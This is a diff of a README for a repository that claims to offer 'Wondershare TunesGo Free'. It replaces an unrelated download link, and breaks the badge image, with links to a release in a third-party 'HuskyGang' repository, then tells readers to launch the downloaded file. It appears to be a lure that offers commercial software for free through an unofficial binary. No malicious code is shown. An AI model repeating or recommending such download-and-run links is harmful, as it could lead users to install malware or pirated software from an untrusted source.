@@ -24,8 +24,8 @@ Welcome to the Wondershare TunesGo Free GitHub repository! Here you will find al
     - wondershare-tunesgo-not-working
 
 ## 📦 Download the Latest Release
-![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green)
-- Click the following link to download the latest version of Wondershare TunesGo Free: [Download Here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+![Download Latest Release](https://github.com/HuskyGang/Wondershare-TunesGo-Free/releases/tag/v1.0%20Release-green)
+- Click the following link to download the latest version of Wondershare TunesGo Free: [Download Here](https://github.com/HuskyGang/Wondershare-TunesGo-Free/releases/tag/v1.0)
 - Once downloaded, launch the file to get started with the wonders of Wondershare TunesGo!
 
 ## 🎶 Explore Wondershare TunesGo
